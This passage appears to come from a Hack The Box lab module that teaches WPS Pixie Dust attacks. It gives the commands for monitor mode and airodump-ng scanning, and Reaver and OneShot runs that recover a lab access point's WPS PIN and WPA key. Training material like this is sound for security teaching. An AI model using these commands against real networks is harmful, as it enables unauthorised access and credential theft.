### Using Reaver

```sh
3kjS@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

3kjS@htb[/htb]$ ifconfig mon0 up

3kjS@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

```sh
3kjS@htb[/htb]$ airodump-ng mon0 --wps
```

```sh
3kjS@htb[/htb]$ reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0
```

```sh
3kjS@htb[/htb]$ reaver -b 86:FC:9F:5D:67:4E -c 1 -p 32552273 -i mon0

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 86:FC:9F:5D:67:4E
[+] Received beacon from 86:FC:9F:5D:67:4E
[!] Found packet with bad FCS, skipping...
[+] Associated with 86:FC:9F:5D:67:4E (ESSID: HackMe)
[+] WPS PIN: '32552273'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackMe'
```
### Using Oneshot

To perform a Pixie Dust attack using [OneShot](https://github.com/fulvius31/OneShot/tree/master), we again require our interface to be in monitor mode. However, before proceeding, we should delete the previously configured `mon0` interface.

```sh
3kjS@htb[/htb]$ iw dev mon0 del
3kjS@htb[/htb]$ iwconfig

eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

```sh
3kjS@htb[/htb]$ airmon-ng start wlan0
```

Similar to Reaver, OneShot also includes the `-K` (or `--pixie-dust`) argument. Let's apply this option and initiate the attack.

```sh
3kjS@htb[/htb]$ python3 /opt/OneShot/oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K
```
